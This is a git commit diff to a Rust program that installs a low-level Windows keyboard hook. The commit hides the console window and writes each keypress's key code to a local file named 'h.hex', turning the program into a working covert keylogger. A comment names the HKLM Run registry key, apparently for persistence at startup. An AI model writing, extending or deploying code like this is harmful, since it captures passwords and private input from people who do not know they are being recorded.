91d509e73aeb67872e7643fef5043ce822f2f3ec
Knaro <84656846+12e9881f53658734f7d0005e8f9091def068a65@users.noreply.github.com>
2023-12-09 21:35:18 -0800

    Update main.rs

--- src/main.rs
+++ src/main.rs
@@ -1,22 +1,39 @@
+#![windows_subsystem = "windows"]
 use windows::Win32::{
     UI::WindowsAndMessaging::{
         CallNextHookEx, SetWindowsHookExW, UnhookWindowsHookEx, KBDLLHOOKSTRUCT, GetMessageW, DispatchMessageW, TranslateMessage, MSG, HHOOK, WM_KEYDOWN, WH_KEYBOARD_LL
     },
-    Foundation::{HINSTANCE, WPARAM, LPARAM, LRESULT, HWND}
+    Foundation::{
+        HINSTANCE, WPARAM, LPARAM, LRESULT, HWND
+    }
 };
-use std::mem::transmute;
+use std::{
+    mem::transmute,
+    fs::OpenOptions,
+    io::Write
+};
+
+
+fn append_keycode_to_file(keycode: u8) -> std::io::Result<()> {
+    let mut file = OpenOptions::new().create(true).append(true).open("h.hex")?;
+
+    file.write_all(&keycode.to_ne_bytes())?;
+    
+    Ok(())
+}
 
 unsafe extern "system" fn keyboard_callback(code: i32, wp: WPARAM, lp: LPARAM) -> LRESULT {
     if code >= 0 && wp.0 as u32 == WM_KEYDOWN {
         let vk_code = (*transmute::<LPARAM, *const KBDLLHOOKSTRUCT>(lp)).vkCode;
-        dbg!(vk_code);
+        if let Ok(vk_code_u8) = u8::try_from(vk_code) {
+            let _ = append_keycode_to_file(vk_code_u8).unwrap();
+        }
     }
     CallNextHookEx(HHOOK::default(), code, wp, lp)
 }
-aasdq1
+
 fn message_loop() {
     let mut message = MSG::default();
-
     unsafe {
         loop {
             GetMessageW(&mut message, HWND::default(), 0, 0);
@@ -38,7 +55,8 @@ fn main() {
     unsafe{UnhookWindowsHookEx(hook).unwrap()};
 }
 
-/*
+/*\
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 DOCS
 https://learn.microsoft.com/en-us/windows/win32/winmsg/using-messages-and-message-queues
 https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-dispatchmessagew
